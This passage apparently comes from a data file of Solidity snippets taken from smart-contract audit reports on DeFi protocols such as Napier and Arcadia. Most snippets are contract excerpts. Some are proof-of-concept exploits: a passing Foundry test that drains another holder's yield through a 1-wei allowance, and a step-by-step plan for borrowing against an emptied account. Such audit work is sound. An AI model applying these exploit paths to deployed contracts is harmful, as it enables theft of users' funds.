0) {\n        tokenId = _nextId++;\n        _mint(params.recipient, tokenId);\n\n        Epoch memory epoch = dvp.getEpoch();\n\n        _positions[tokenId] = ManagedPosition({\n            dvpAddr: params.dvpAddr,\n            strike: params.strike,\n            expiry: epoch.current,\n            premium: premium,\n            leverage: (params.notionalUp + params.notionalDown) / premium,\n            notionalUp: params.notionalUp,\n            notionalDown: params.notionalDown,\n            cumulatedPayoff: 0\n        });\n    } else {\n        ManagedPosition storage position = _positions[tokenId];\n        position.premium += premium;\n        position.notionalUp += params.notionalUp;\n        position.notionalDown += params.notionalDown;\n        position.leverage = (position.notionalUp + position.notionalDown) / position.premium;\n    }\n\n    emit BuyDVP(tokenId, _positions[tokenId].expiry, params.notionalUp + params.notionalDown);\n    emit Buy(params.dvpAddr, _positions[tokenId].expiry, premium, params.recipient);\n}\n```\nfunction testMintAndBurnFail() public {\n    (uint256 tokenId,) = initAndMint();\n    bytes4 PositionNotFound = bytes4(keccak256(""PositionNotFound""));\n\n    vm.prank(alice);\n    vm.expectRevert(PositionNotFound);\n    pm.sell(\n        IPositionManager.SellParams({\n            tokenId: tokenId,\n            notionalUp: 10 ether,\n            notionalDown: 0,\n            expectedMarketValue: 0,\n            maxSlippage: 0.1e18\n        })\n    );\n}\n```\n```\nfunction initAndMint() private returns (uint256 tokenId, IG ig) {\n    vm.startPrank(admin);\n\n    ig = new IG(address(vault), address(ap));\n    ig.grantRole(ig.ROLE_ADMIN(), admin);\n    ig.grantRole(ig.ROLE_EPOCH_ROLLER(), admin);\n    vault.grantRole(vault.ROLE_ADMIN(), admin);\n    vault.setAllowedDVP(address(ig));\n\n    MarketOracle mo = MarketOracle(ap.marketOracle());\n\n    mo.setDelay(ig.baseToken(), ig.sideToken(), ig.getEpoch().frequency, 0, true);\n\n    Utils.skipDay(true, vm);\n    ig.rollEpoch();\n    vm.stopPrank();\n\n    uint256 strike = ig.currentStrike();\n\n    (uint256 expectedMarketValue,) = ig.premium(0, 10 ether, 0);\n    TokenUtils.provideApprovedTokens(admin, baseToken, DEFAULT_SENDER, address(pm), expectedMarketValue, vm);\n\n    vm.prank(DEFAULT_SENDER);\n    (tokenId,) = pm.mint(\n        IPositionManager.MintParams({\n            dvpAddr: address(ig),\n            notionalUp: 10 ether,\n            notionalDown: 0,\n            strike: strike + 1,\n            recipient: alice,\n            tokenId: 0,\n            expectedPremium: expectedMarketValue,\n            maxSlippage: 0.1e18,\n            nftAccessTokenId: 0\n        })\n    );\n    assertGe(1, tokenId);\n    assertGe(1, pm.totalSupply());\n}\n```\n```\nforge test --match-contract PositionManagerTest --match-test testMintAndBurnFail -vvv\n```"
"```\n(obtainedPremium, ) = dvp.premium(params.strike, params.notionalUp, params.notionalDown)\n```\n```\nIERC20Metadata(baseToken).safeTransferFrom(\n    msg.sender,\n    vault,\n    premium_ + vaultFee\n)"
"```\ncontract Vault is\n    IVault,\n    ERC20,\n    EpochControls,\n    AccessControl,\n    Pausable {\n```\n```\nfunction transfer(address to, uint256 amount) public virtual override returns (bool) {\n    address owner = _msgSender();\n    _transfer(owner, to, amount);\n    return true;\n}\n```\n```\nif (_state.liquidity.totalDeposit > maxDeposit) {\n    revert ExceedsMaxDeposit();\n}\n\nif (amount > maxDeposit - _state.liquidity.totalDeposit) {\n    revert ExceedsMaxDeposit();\n}\n```"
"```\nif (obtainedPremium > premium) {\n    baseToken.safeTransferFrom(address(this), msg.sender, obtainedPremium - premium);\n}\n```\n```\nfunction transferFrom(\n    address sender,\n    address recipient,\n    uint256 amount\n) public virtual override returns (bool) {\n    _transfer(sender, recipient, amount);\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, ""ERC20: transfer amount exceeds allowance""));\n    return true;\n}\n```\n```\nfunction transferFrom(\n    address from,\n    address to,\n    uint256 value\n)\n    external\n    override\n    whenNotPaused\n    notBlacklisted(msg.sender)\n    notBlacklisted(from)\n    notBlacklisted(to)\n    returns (bool)\n{\n    require(\n        value <= allowed[from][msg.sender],\n        ""ERC20: transfer amount exceeds allowance""\n    );\n    _transfer(from, to, value);\n    allowed[from][msg.sender] = allowed[from][msg.sender].sub(value);\n    return true;\n}\n```"
"```\nfunction trackVaultFee(address vault, uint256 feeAmount) external {\n    IDVP dvp = IDVP(msg.sender);\n    if (vault!= dvp.vault()) {\n        revert WrongVault();\n    }\n\n    vaultFeeAmounts[vault] += feeAmount;\n\n    emit TransferVaultFee(vault, feeAmount);\n}\n```\nfunction receiveFee(uint256 feeAmount) external {\n    _getBaseTokenInfo(msg.sender).safeTransferFrom(msg.sender, address(this), feeAmount);\n    senders[msg.sender] += feeAmount;\n\n    emit ReceiveFee(msg.sender, feeAmount);\n}\n\nfunction _getBaseTokenInfo(address sender) internal view returns (IERC20Metadata token) {\n    token = IERC20Metadata(IVaultParams(sender).baseToken());\n}\n```"
"```\nfunction bullDelta(uint256 k, uint256 kB, uint256 s, uint256 theta) internal pure returns (int256) {\n    SD59x18 delta;\n    if (s <= k) {\n        return 0;\n    } else if (s > kB) {\n        return (1 - sqrt(uint256(kB) / k)) / k;\n    } else {\n        return 1 / k - 1 / sqrt(uint256(s) * k);\n    }\n}\n```"
"```\nif (SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {\n    if (SignedMath.abs(tokensToSwap) - params.sideTokensAmount < params.sideTokensAmount / 10000) {\n        tokensToSwap = SignedMath.revabs(params.sideTokensAmount, true);\n    }\n}\n```"
"```\nfunction safeApprove(\n    IERC20 token,\n    address spender,\n    uint256 value\n) internal {\n    require(\n        (value == 0) || (token.allowance(address(this), spender) == 0),\n        ""SafeERC20: approve from non-zero to non-zero allowance""\n    );\n    _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n}\n```"
"```\nfunction testswapExactTokensForETHStuckTokens() public {\n    address wrappedTokenA = IChilizWrapperFactory(wrapperFactory).wrappedTokenFor(address(tokenA));\n\n    tokenA.approve(address(wrapperFactory), type(uint256).max);\n    wrapperFactory.wrap(address(this), address(tokenA), 100);\n\n    IERC20(wrappedTokenA).approve(address(router), 100 ether);\n    router.addLiquidityETH{value: 100 ether}(wrappedTokenA, 100 ether, 0, 0, address(this), type(uint40).max);\n\n    address pairAddress = factory.getPair(address(WETH), wrapperFactory.wrappedTokenFor(address(tokenA)));\n\n    uint256 pairBalance = IJalaPair(pairAddress).balanceOf(address(this));\n\n    address[] memory path = new address[](2);\n    path[0] = wrappedTokenA;\n    path[1] = address(WETH);\n\n    vm.startPrank(user0);\n    console.log(""ETH user balance before:       "", user0.balance);\n    console.log(""TokenA user balance before:    "", tokenA.balanceOf(user0));\n    console.log(""WTokenA router balance before: "", IERC20(wrappedTokenA).balanceOf(address(masterRouter)));\n\n    tokenA.approve(address(masterRouter), 550);\n    masterRouter.swapExactTokensForETH(address(tokenA), 550, 0, path, user0, type(uint40).max);\n    vm.stopPrank();\n\n    console.log(""ETH user balance after:       "", user0.balance);\n    console.log(""TokenA user balance after:    "", tokenA.balanceOf(user0));\n    console.log(""WTokenA router balance after: "", IERC20(wrappedTokenA).balanceOf(address(masterRouter)));\n}"
```\nuint32 timeElapsed = blockTimestamp - blockTimestampLast;  # overflow is desired\nif (timeElapsed > 0 && _reserve0!= 0 && _reserve1!= 0) {\n    price0CumulativeLast += uint256(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n    price1CumulativeLast += uint256(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n}\n```
"```\nuint256 feesAmt = FullMath.mulDiv(feesOwed, cache.holdTokenDebt, borrowedAmount);\nloansFeesInfo[creditor][cache.holdToken] += feesAmt;\nharvestedAmt += feesAmt;\n```"
"```\nborrowing.feesOwed += entranceFee;\n```\nuint256 feesAmt = FullMath.mulDiv(feesOwed, cache.holdTokenDebt, borrowedAmount);\nloansFeesInfo[creditor][cache.holdToken] += feesAmt;\nharvestedAmt += feesAmt;\n```"
"```\n(collateralBalance, currentFees) = _calculateCollateralBalance(\n    borrowing.borrowedAmount,\n    borrowing.accLoanRatePerSeconds,\n    borrowing.dailyRateCollateralBalance,\n    borrowing.accLoanRatePerSeconds\n)\n\nif collateralBalance > 0:\n    # rest of code\nelse:\n    currentFees = borrowing.dailyRateCollateralBalance  # entire collateral amount\nborrowing.feesOwed += _pickUpPlatformFees(borrowing.holdToken, currentFees)\n```"
"```\nfunction redeemWithYT(address from, address to, uint256 pyAmount) external nonReentrant returns (uint256) {\n    accruedInTarget += _computeAccruedInterestInTarget(\n        _gscales.maxscale,\n        _lscale,\n        _yt.balanceOf(from)\n    );\n\n    uint256 sharesRedeemed = pyAmount.divWadDown(_gscales.maxscale);\n\n    _target.safeTransfer(address(adapter), sharesRedeemed + accruedInTarget);\n\n    (uint256 amountWithdrawn, ) = adapter.prefundedRedeem(to);\n\n    return amountWithdrawn;\n}\n```\n```\npragma solidity ^0.8.0;\n\nimport {TestTranche} from ""./Tranche.t.sol"";\nimport ""forge-std/console2.sol"";\n\ncontract TrancheAllowanceIssue is TestTranche {\n    address bob = address(0x22);\n\n    function setUp() public virtual override {\n        super.setUp();\n    }\n\n    function testTrancheAllowanceIssue() public {\n        // 1. issue some PT and YT\n        deal(address(underlying), address(this), 1_000_000, true);\n        tranche.issue(address(this), 1_000_000);\n\n        // 2. generating some unclaimed yield\n        vm.warp(block.timestamp + 30 days);\n        _simulateScaleIncrease();\n\n        // 3. give bob any negligible allowance, could be as low as only 1wei\n        tranche.approve(bob, 1);\n        yt.approve(bob, 1);\n\n        // 4. all unclaimed and pending yield drained by bob\n        assertEq(0, underlying.balanceOf(bob));\n        vm.prank(bob);\n        tranche.redeemWithYT(address(this), bob, 1);\n        assertTrue(underlying.balanceOf(bob) > 494_000_000);\n    }\n}\n```\n2024-01-napier\napier-v1> forge test --match-test testTrancheAllowanceIssue -vv\n[⠔] Compiling\n[⠊] Compiling 42 files with 0.8.19\n[⠔] Solc 0.8.19 finished in 82.11s\nCompiler run successful!\n[⠒] Solc 0.8.19 finished in 82.11s\n\nRunning 1 test for test/unit/TrancheAllowanceIssue.t.sol:TrancheAllowanceIssue\n[PASS] testTrancheAllowanceIssue() (gas: 497585)\nTest result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.06ms\n\nRan 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```"
"```\nFile: PoolMath.sol\n\nint256 internal constant N_COINS = 3;\n\nfunction swapExactBaseLpTokenForUnderlying(PoolState memory pool, uint256 exactBaseLptIn)\n    internal\n{\n    // Note: Here we are multiplying by N_COINS because the swap formula is defined in terms of the amount of PT being swapped.\n    // BaseLpt is equivalent to 3 times the amount of PT due to the initial deposit of 1:1:1:1=pt1:pt2:pt3:Lp share in Curve pool.\n    exactBaseLptIn * N_COINS\n}\n\nfunction swapUnderlyingForExactBaseLpToken(PoolState memory pool, uint256 exactBaseLptOut)\n{\n    (int256 _netUnderlyingToAccount18, int256 _netUnderlyingFee18, int256 _netUnderlyingToProtocol18) = executeSwap(\n        pool,\n        // Note: sign is defined from the perspective of the swapper.\n        // positive because the swapper is buying pt\n        exactBaseLptOut * N_COINS\n```\n```\nFile: NapierPool.sol\n\nuint256 internal constant N_COINS = 3;\n\n//...SNIP...\n\ntotalBaseLptTimesN: baseLptUsed * N_COINS,\n\ntotalBaseLptTimesN: totalBaseLpt * N_COINS,\n```"
"```\nfunction prefundedDeposit() external nonReentrant returns (uint256, uint256) {\n    uint256 bufferEthCache = bufferEth; // cache storage reads\n    uint256 queueEthCache = withdrawalQueueEth; // cache storage reads\n    uint256 assets = IWETH9(WETH).balanceOf(address(this)) - bufferEthCache; // amount of WETH deposited at this time\n    uint256 shares = previewDeposit(assets);\n\n    if (assets == 0) {\n        return (0, 0);\n    }\n    if (shares == 0) {\n        revert ZeroShares();\n    }\n}\n```"
"```\nfunction issue(\n    address to,\n    uint256 underlyingAmount\n) external nonReentrant whenNotPaused notExpired returns (uint256 issued) {\n    lscales[to] = _maxscale;\n    delete unclaimedYields[to];\n\n    uint256 yBal = _yt.balanceOf(to);\n\n    if (_lscale!= 0) {\n        accruedInTarget += _computeAccruedInterestInTarget(_maxscale, _lscale, yBal);\n    }\n\n    uint256 sharesUsed = sharesMinted + accruedInTarget;\n    uint256 fee = sharesUsed.mulDivUp(issuanceFeeBps, MAX_BPS);\n    issued = (sharesUsed - fee).mulWadDown(_maxscale);\n\n    issuanceFees += fee;\n    _mint(to, issued);\n    _yt.mint(to, issued);\n}\n```"
"```\nfunction withdraw(\n    uint256 underlyingAmount,\n    address to,\n    address from\n) external override nonReentrant expired returns (uint256) {\n    GlobalScales memory _gscales = gscales;\n    uint256 cscale = _updateGlobalScalesCache(_gscales);\n\n    uint256 sharesRedeem = underlyingAmount.divWadDown(cscale);\n    uint256 principalAmount = _computePrincipalTokenRedeemed(_gscales, sharesRedeem);\n\n    gscales = _gscales;\n    _burnFrom(from, principalAmount);\n    _target.safeTransfer(address(adapter), sharesRedeem);\n    (uint256 underlyingWithdrawn, ) = adapter.prefundedRedeem(to);\n}\n```"
```\nfunction setRebalancer(address _rebalancer) external onlyOwner {\n    rebalancer = _rebalancer;\n}\n```\n```\nfunction setTargetBufferPercentage(uint256 _targetBufferPercentage) external onlyRebalancer {\n    if (_targetBufferPercentage < MIN_BUFFER_PERCENTAGE || _targetBufferPercentage > BUFFER_PERCENTAGE_PRECISION) {\n        revert InvalidBufferPercentage();\n    }\n    targetBufferPercentage = _targetBufferPercentage;\n}\n```
"```\nfunction prefundedDeposit() external nonReentrant returns (uint256, uint256) {\n    uint256 stakeAmount;\n    unchecked {\n        stakeAmount = availableEth + queueEthCache - targetBufferEth; // non-zero, no underflow\n    }\n    uint256 maxStakeAmount = (availableEth * 95) / 100;\n    if (stakeAmount > maxStakeAmount) {\n        stakeAmount = maxStakeAmount; // max 95% of the available ETH\n    }\n\n    // Deposit into the yield source\n    // Actual amount of ETH spent may be less than the requested amount.\n    stakeAmount = _stake(stakeAmount); // stake amount can be 0\n}\n```\nFile: StEtherAdapter.sol\n\nfunction _stake(uint256 stakeAmount) internal override returns (uint256) {\n    uint256 stakeLimit = STETH.getCurrentStakeLimit();\n    if (stakeAmount > stakeLimit) {\n        // Cap stake amount\n        stakeAmount = stakeLimit;\n    }\n\n    IWETH9(Constants.WETH).withdraw(stakeAmount);\n    uint256 _stETHAmt = STETH.submit{value: stakeAmount}(address(this));\n\n    if (_stETHAmt == 0) revert InvariantViolation();\n    return stakeAmount;\n}\n```\n```\nFile: SFrxETHAdapter.sol\n\nfunction _stake(uint256 stakeAmount) internal override returns (uint256) {\n    IWETH9(Constants.WETH).withdraw(stakeAmount);\n    FRXETH_MINTER.submit{value: stakeAmount}();\n    uint256 received = STAKED_FRXETH.deposit(stakeAmount, address(this));\n    if (received == 0) revert InvariantViolation();\n\n    return stakeAmount;\n}\n```\n```\nfunction _submit(address recipient) internal nonReentrant {\n    require(!submitPaused, ""Submit is paused"");\n    require(msg.value!= 0, ""Cannot submit 0"");\n}\n```"
"```\nfunction test_protocol_owner_frontRuns_swaps_with_higher_fees() public whenMaturityNotPassed {\n    vm.warp(maturity - 30 days);\n    deal(address(pts[0]), alice, type(uint96).max, false); // ensure alice has enough pt\n    uint256 preBaseLptSupply = tricrypto.totalSupply();\n    uint256 ptInDesired = 100 * ONE_UNDERLYING;\n    uint256 expectedBaseLptIssued = tricrypto.calc_token_amount([ptInDesired, 0, 0], true);\n\n    vm.startPrank(owner);\n    pool.setFeeParameter(""protocolFeePercent"", 100);\n    vm.stopPrank();\n\n    vm.prank(alice);\n    uint256 underlyingOut = pool.swapPtForUnderlying(\n        0, ptInDesired, recipient, abi.encode(CallbackInputType.SwapPtForUnderlying, SwapInput(underlying, pts[0]))\n    );\n\n    // sanity check\n    uint256 protocolFee = SwapEventsLib.getProtocolFeeFromLastSwapEvent(pool);\n    assertGt(protocolFee, 0, ""fee should be charged"");\n}\n```"
"```\ncontract SFrxETHAdapter is BaseLSTAdapter, IERC721Receiver {\n    /// @title SFrxETHAdapter - esfrxETH\n    /// @dev Important security note:\n    /// 1. The vault share price (esfrxETH / WETH) increases as sfrxETH accrues staking rewards.\n    /// However, the share price decreases when frxETH (sfrxETH) is withdrawn.\n    /// Withdrawals are processed by the FraxEther redemption queue contract.\n    /// Frax takes a fee at the time of withdrawal requests, which temporarily reduces the share price.\n    /// This loss is pro-rated among all esfrxETH holders.\n    /// As a mitigation measure, we allow only authorized rebalancers to request withdrawals.\n    /// \n    /// 2. This contract doesn't independently keep track of the sfrxETH balance, so it is possible\n    /// for an attacker to directly transfer sfrxETH to this contract, increase the share price.\n}"
"```\nfunction issue(\n    address to,\n    uint256 underlyingAmount\n) external nonReentrant whenNotPaused notExpired returns (uint256 issued) {\n    // Transfer underlying from user to adapter and deposit it into adapter to get target token\n    _underlying.safeTransferFrom(msg.sender, address(adapter), underlyingAmount);\n    (, uint256 sharesMinted) = adapter.prefundedDeposit();\n\n    // Deduct the issuance fee from the amount of target token minted + reinvested yield\n    uint256 sharesUsed = sharesMinted + accruedInTarget;\n    uint256 fee = sharesUsed.mulDivUp(issuanceFeeBps, MAX_BPS);\n    issued = (sharesUsed - fee).mulWadDown(_maxscale);\n\n    // Accumulate issueance fee in units of target token\n    issuanceFees += fee;\n    // Mint PT and YT to user\n    _mint(to, issued);\n    _yt.mint(to, issued);\n\n    emit Issue(msg.sender, to, issued, sharesUsed);\n}\n```"
"```\nfunction claimWithdrawal() external override {\n    uint256 _requestId = requestId;\n    uint256 _withdrawalQueueEth = withdrawalQueueEth;\n    if (_requestId == 0) revert NoPendingWithdrawal();\n\n    delete withdrawalQueueEth;\n    delete requestId;\n    bufferEth += _withdrawalQueueEth;\n\n    uint256 balanceBefore = address(this).balance;\n    REDEMPTION_QUEUE.burnRedemptionTicketNft(_requestId, payable(this));\n    if (address(this).balance < balanceBefore + _withdrawalQueueEth) revert InvariantViolation();\n\n    IWETH9(Constants.WETH).deposit{value: _withdrawalQueueEth}();\n}\n```\n```\nfunction burnRedemptionTicketNft(uint256 _nftId, address payable _recipient) external nonReentrant {\n    // Effects: Burn frxEth to match the amount of ether sent to user 1:1\n    FRX_ETH.burn(_redemptionQueueItem.amount);\n\n    // Interactions: Transfer ETH to recipient, minus the fee\n    (bool _success, ) = _recipient.call{ value: _redemptionQueueItem.amount }("""");\n    if (!_success) revert InvalidEthTransfer();\n}\n```\n```\nFile: FraxEtherRedemptionQueue.sol\n\nfunction recoverEther(uint256 _amount) external {\n    _requireSenderIsTimelock();\n\n    (bool _success, ) = address(msg.sender).call{ value: _amount }("""");\n    if (!_success) revert InvalidEthTransfer();\n\n    emit RecoverEther({ recipient: msg.sender, amount: _amount });\n}\n```"
```\nfunction pause() external onlyManagement {\n    _pause();\n}\n\nfunction unpause() external onlyManagement {\n    _unpause();\n}\n```\n```\nfunction collect() public nonReentrant whenNotPaused returns (uint256) {\n    uint256 _lscale = lscales[msg.sender];\n    uint256 accruedInTarget = unclaimedYields[msg.sender];\n```
"```\nfunction swapUnderlyingForYt(\n    address pool,\n    uint256 index,\n    uint256 ytOutDesired,\n    uint256 underlyingInMax,\n    address recipient,\n    uint256 deadline\n) external payable override nonReentrant checkDeadline(deadline) returns (uint256) {\n    // Variable Definitions:\n    // - `uDeposit`: The amount of underlying asset that needs to be deposited to issue PT and YT.\n    // - `ytOutDesired`: The desired amount of PT and YT to be issued.\n    // - `cscale`: Current scale of the Tranche.\n    // - `maxscale`: Maximum scale of the Tranche (denoted as 'S' in the formula).\n    // - `issuanceFee`: Issuance fee in basis points. (10000 =100%).\n\n    // Formula for `Tranche.issue`:\n    // shares = uDeposit / s\n    // fee = shares * issuanceFeeBps / 10000\n    // pyIssue = (shares - fee) * S\n\n    // Solving for `uDeposit`:\n    // uDeposit = (pyIssue * s / S) / (1 - issuanceFeeBps / 10000)\n    // Hack:\n    // Buffer is added to the denominator.\n    // This ensures that at least `ytOutDesired` amount of PT and YT are issued.\n    // If maximum scale and current scale are significantly different or `ytOutDesired` is small, the function might fail.\n    // Without this buffer, any rounding errors that reduce the issued PT and YT could lead to an insufficient amount of PT to be repaid to the pool.\n    uint256 uDepositNoFee = cscale * ytOutDesired / maxscale;\n    uint256 uDeposit = uDepositNoFee * MAX_BPS / (MAX_BPS - (series.issuanceFee + 1)); // 0.01 bps buffer\n}\n```\n```\nuDepositNoFee = cscale * ytOutDesired / maxscale\nuDepositNoFee = 1.2e18 * 123 / 1.25e18\nuDepositNoFee = 118.08\nuDepositNoFee = 118\n\nuDeposit = uDepositNoFee * MAX_BPS / (MAX_BPS - (series.issuanceFee + 1))\nuDeposit = 118 * 10000 / (10000 - (0 + 1))\nuDeposit = 118.0118012\nuDeposit = 118\n```\nshares = assets * (total_supply / total_assets)\nshares = 118 * (100e18 / 120e18) = 98.33333333 = 98\n```\n```\nissued = (sharesUsed - fee).mulWadDown(_maxscale)\nissued = (sharesUsed - 0).mulWadDown(_maxscale)\nissued = sharesUsed.mulWadDown(_maxscale)\n\nissued = sharesUsed * _maxscale / WAD\nissued = 98 * 1.25e18 / 1e18\nissued = 122.5\nissued = 122\n```\n```\nfunction issue(\n    address to,\n    uint256 underlyingAmount\n) external nonReentrant whenNotPaused notExpired returns (uint256 issued) {\n    uint256 sharesUsed = sharesMinted + accruedInTarget;\n    uint256 fee = sharesUsed.mulDivUp(issuanceFeeBps, MAX_BPS);\n    issued = (sharesUsed - fee).mulWadDown(_maxscale);\n}\n```\n```\nfunction swapCallback(int256 underlyingDelta, int256 ptDelta, bytes calldata data) external override {\n    uint256 pyIssued = params.pt.issue({to: address(this), underlyingAmount: params.underlyingDeposit});\n\n    if (pyIssued < pyDesired) {\n        revert Errors.RouterInsufficientPtRepay();\n    }\n```"
"```\nFile: FraxEtherRedemptionQueue.sol\n\nfunction setRedemptionFee(uint64 _newFee) external {\n    _requireSenderIsTimelock();\n    if (_newFee > FEE_PRECISION) revert ExceedsMaxRedemptionFee(_newFee, FEE_PRECISION);\n\n    emit SetRedemptionFee({\n        oldRedemptionFee: redemptionQueueState.redemptionFee,\n        newRedemptionFee: _newFee\n    });\n\n    redemptionQueueState.redemptionFee = _newFee;\n}\n```\n```\nfunction enterRedemptionQueue(address _recipient, uint120 _amountToRedeem) public nonReentrant {\n    RedemptionQueueState memory _redemptionQueueState = redemptionQueueState;\n    RedemptionQueueAccounting memory _redemptionQueueAccounting = redemptionQueueAccounting;\n\n    uint120 _redemptionFeeAmount = ((uint256(_amountToRedeem) * _redemptionQueueState.redemptionFee) / FEE_PRECISION).toUint120();\n\n    uint120 _amountEtherOwedToUser = _amountToRedeem - _redemptionFeeAmount;\n\n    _redemptionQueueAccounting.etherLiabilities += uint128(_amountEtherOwedToUser);\n\n    _redemptionQueueAccounting.unclaimedFees += _redemptionFeeAmount;\n\n    uint64 _maturityTimestamp = uint64(block.timestamp) + _redemptionQueueState.queueLengthSecs;\n\n    nftInformation[_redemptionQueueState.nextNftId] = RedemptionQueueItem({\n        amount: _amountEtherOwedToUser,\n        maturity: _maturityTimestamp,\n        hasBeenRedeemed: false,\n        earlyExitFee: _redemptionQueueState.earlyExitFee\n    });\n}"
"```\nfunction prefundedRedeem(address recipient) external virtual returns (uint256, uint256) {\n    // SOME CODE\n\n    if (assets > bufferEthCache) {\n        revert InsufficientBuffer();\n    }\n\n    // SOME CODE\n}\n```\n```\nfunction prefundedDeposit() external nonReentrant returns (uint256, uint256) {\n    if (targetBufferEth >= availableEth + queueEthCache) {\n        bufferEth = availableEth.toUint128();\n        return (assets, shares);\n    }\n}\n```"
"```\n1) Deposit ERC721\n2) Set creditor to malicious designed creditor\n3) Transfer the account to itself\n4) flashActionByCreditor to transfer ERC721\n    4a) Account owns itself, so _transferFromOwner allows transfers from account\n    4b) Account is now empty, but still thinks it has ERC721\n5) Use malicious designed liquidator contract to call auctionBoughtIn\n    and transfer account back to attacker\n6) Update creditor to legitimate creditor\n7) Take out loan against nothing\n8) Profit\n```\n```\nif (transferFromOwnerData.assets.length > 0):\n    _transferFromOwner(transferFromOwnerData, actionTarget)\n```\n```\nfunction auctionBoughtIn(address recipient) external onlyLiquidator nonReentrant {\n    _transferOwnership(recipient);\n}\n```"
"```\npragma solidity ^0.8.0;\n\ncontract Liquidator {\n    function bid(\n        address account,\n        uint256[] memory askedAssetAmounts,\n        bool endAuction_\n    ) external nonReentrant {\n        AuctionInformation storage auctionInformation_ = auctionInformation[account];\n        if (!auctionInformation_.inAuction) {\n            revert LiquidatorErrors.NotForSale();\n        }\n\n        uint256 totalShare = _calculateTotalShare(auctionInformation_, askedAssetAmounts);\n        uint256 price = _calculateBidPrice(auctionInformation_, totalShare);\n\n        uint128 startDebt = auctionInformation_.startDebt;\n        bool earlyTerminate = ILendingPool(auctionInformation_.creditor).auctionRepay(\n            startDebt,\n            auctionInformation_.minimumMargin,\n            price,\n            account,\n            msg.sender\n        );\n    }\n}\n```\n```\nfunction auctionRepay(\n    uint256 startDebt,\n    uint256 minimumMargin_,\n    uint256 amount,\n    address account,\n    address bidder\n) \n    external\n    whenLiquidationNotPaused\n    onlyLiquidator\n    processInterests\n    returns (bool earlyTerminate)\n{\n    asset.safeTransferFrom(bidder, address(this), amount);\n\n    uint256 accountDebt = maxWithdraw(account);\n    if (accountDebt == 0) {\n        revert LendingPoolErrors.IsNotAnAccountWithDebt();\n    }\n    if (accountDebt <= amount) {\n        // The amount recovered by selling assets during the auction is bigger than the total debt of the Account.\n        // -> Terminate the auction and make the surplus available to the Account-Owner.\n        earlyTerminate = true;\n        unchecked {\n            _settleLiquidationHappyFlow(account, startDebt, minimumMargin_, bidder, (amount - accountDebt));\n        }\n        amount = accountDebt;\n    }\n\n    _withdraw(amount, address(this), account);\n\n    emit Repay(account, bidder, amount);\n}\n```\n```\nfunction bid(address account, uint256[] memory askedAssetAmounts, bool endAuction_) external nonReentrant {\n    // Transfer the assets to the bidder.\n    IAccount(account).auctionBid(\n        auctionInformation_.assetAddresses, auctionInformation_.assetIds, askedAssetAmounts, msg.sender\n    );\n\n    if (earlyTerminate) {\n        // Stop the auction, no need to do a health check for the account since it has no debt anymore.\n        _endAuction(account);\n    } else if (endAuction_) {\n        if (_settleAuction(account, auctionInformation_)) _endAuction(account);\n    }\n}\n```\n```\nfunction _settleAuction(address account, AuctionInformation storage auctionInformation_)\n    internal\n    returns (bool success)\n{\n    uint256 startDebt = auctionInformation_.startDebt;\n    address creditor = auctionInformation_.creditor;\n    uint96 minimumMargin = auctionInformation_.minimumMargin;\n\n    uint256 collateralValue = IAccount(account).getCollateralValue();\n    uint256 usedMargin = IAccount(account).getUsedMargin();\n\n    if (collateralValue >= usedMargin || usedMargin == minimumMargin) {\n        // Happy flow: Account is back in a healthy state.\n        // An Account is healthy if the collateral value is equal or greater than the used margin.\n        // If usedMargin is equal to minimumMargin, the open liabilities are 0 and the Account is always healthy.\n        ILendingPool(creditor).settleLiquidationHappyFlow(account, startDebt, minimumMargin, msg.sender);\n    } else if (collateralValue == 0) {\n        // Unhappy flow: All collateral is sold.\n        ILendingPool(creditor).settleLiquidationUnhappyFlow(account, startDebt, minimumMargin, msg.sender);\n    }\n\n    return true;\n}\n```\n```\nfunction settleLiquidationUnhappyFlow(\n    address account,\n    uint256 startDebt,\n    uint256 minimumMargin_,\n    address terminator\n) external whenLiquidationNotPaused onlyLiquidator processInterests {\n    uint256 debtShares = balanceOf[account];\n    uint256 openDebt = convertToAssets(debtShares);\n    uint256 badDebt;\n\n    // Any remaining debt that was not recovered during the auction must be written off.\n    // Depending on the size of the remaining debt, different stakeholders will be impacted.\n\n    // Remove the remaining debt from the Account now that it is written off from the liquidation incentives/Liquidity Providers.\n    _burn(account, debtShares);\n    realisedDebt -= openDebt;\n    emit Withdraw(msg.sender, account, account, openDebt, debtShares);\n\n    _endLiquidation();\n\n    emit AuctionFinished(\n        account, address(this), startDebt, initiationReward, terminationReward, liquidationPenalty, badDebt, 0\n    );\n}\n```\n```\nfunction flashAction(\n    uint256 amountBorrowed,\n    address account,\n    address actionTarget,\n    bytes calldata actionData,\n    bytes3 referrer\n) external whenBorrowNotPaused processInterests {\n    uint256 accountVersion = IAccount(account).flashActionByCreditor(actionTarget, actionData);\n    if (!isValidVersion[accountVersion]) revert LendingPoolErrors.InvalidVersion();\n}\n```\n```\nfunction flashActionByCreditor(address actionTarget, bytes calldata actionData)\n    external\n    nonReentrant\n    notDuringAuction\n    updateActionTimestamp\n    returns (uint256 accountVersion)\n{\n    // Account must be healthy after actions are executed.\n    if (isAccountUnhealthy()) revert AccountErrors.AccountUnhealthy();\n}\n```"
"```\n// AccountV1.sol\n\nfunction _deposit(\n    address[] memory assetAddresses,\n    uint256[] memory assetIds,\n    uint256[] memory assetAmounts,\n    address from\n) internal {\n    uint256[] memory assetTypes = \n        IRegistry(registry).batchProcessDeposit(creditor, assetAddresses, assetIds, assetAmounts);\n\n    for (uint256 i = 0; i < assetAddresses.length; ++i) {\n        // Skip if amount is 0 to prevent storing addresses that have 0 balance.\n        if (assetAmounts[i] == 0) continue;\n\n        if (assetTypes[i] == 0) {\n            if (assetIds[i]!= 0) {\n                revert AccountErrors.InvalidERC20Id();\n            }\n            _depositERC20(from, assetAddresses[i], assetAmounts[i]);\n        } else if (assetTypes[i] == 1) {\n            if (assetAmounts[i]!= 1) {\n                revert AccountErrors.InvalidERC721Amount();\n            }\n            _depositERC721(from, assetAddresses[i], assetIds[i]);\n        } else if (assetTypes[i] == 2) {\n            _depositERC1155(from, assetAddresses[i], assetIds[i], assetAmounts[i]);\n        } else {\n            revert AccountErrors.UnknownAssetType();\n        }\n    }\n\n    if (erc20Stored.length + erc721Stored.length + erc1155Stored.length > ASSET_LIMIT) {\n        revert 